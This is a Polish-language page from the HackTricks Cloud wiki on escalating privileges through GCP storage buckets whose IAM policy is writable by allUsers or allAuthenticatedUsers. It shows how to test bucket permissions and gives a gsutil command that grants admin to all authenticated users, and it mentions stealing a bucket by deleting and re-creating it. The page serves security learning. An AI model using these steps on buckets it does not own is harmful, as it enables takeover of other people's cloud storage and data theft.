# GCP - Eskalacja Uprawnień Publicznych Buckets

{% hint style="success" %}
Ucz się i ćwicz Hacking AWS:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Ucz się i ćwicz Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się trikami hackingowymi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
{% endhint %}

## Eskalacja Uprawnień Buckets

Jeśli polityka bucketu pozwala na to, aby „allUsers” lub „allAuthenticatedUsers” **zapisywały do swojej polityki bucketu** (uprawnienie **storage.buckets.setIamPolicy**), to każdy może zmodyfikować politykę bucketu i przyznać sobie pełny dostęp.

### Sprawdzanie Uprawnień

Są 2 sposoby na sprawdzenie uprawnień do bucketu. Pierwszym jest zapytanie o nie, wysyłając żądanie do `https://www.googleapis.com/storage/v1/b/BUCKET_NAME/iam` lub uruchamiając `gsutil iam get gs://BUCKET_NAME`.

Jednakże, jeśli twój użytkownik (potencjalnie należący do "allUsers" lub "allAuthenticatedUsers") nie ma uprawnień do odczytu polityki iam bucketu (storage.buckets.getIamPolicy), to to nie zadziała.

Drugą opcją, która zawsze zadziała, jest użycie punktu końcowego testPermissions bucketu, aby sprawdzić, czy masz określone uprawnienie, na przykład uzyskując dostęp do: `https://www.googleapis.com/storage/v1/b/BUCKET_NAME/iam/testPermissions?permissions=storage.buckets.delete&permissions=storage.buckets.get&permissions=storage.buckets.getIamPolicy&permissions=storage.buckets.setIamPolicy&permissions=storage.buckets.update&permissions=storage.objects.create&permissions=storage.objects.delete&permissions=storage.objects.get&permissions=storage.objects.list&permissions=storage.objects.update`

### Eskalacja

Aby przyznać `Storage Admin` dla `allAuthenticatedUsers`, można uruchomić:
```bash
gsutil iam ch allAuthenticatedUsers:admin gs://BUCKET_NAME
```
Innym atakiem byłoby **usunięcie koszyka i ponowne utworzenie go na swoim koncie, aby ukraść własność**.

## References

* [https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/](https://rhinosecuritylabs.com/gcp/google-cloud-platform-gcp-bucket-enumeration/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
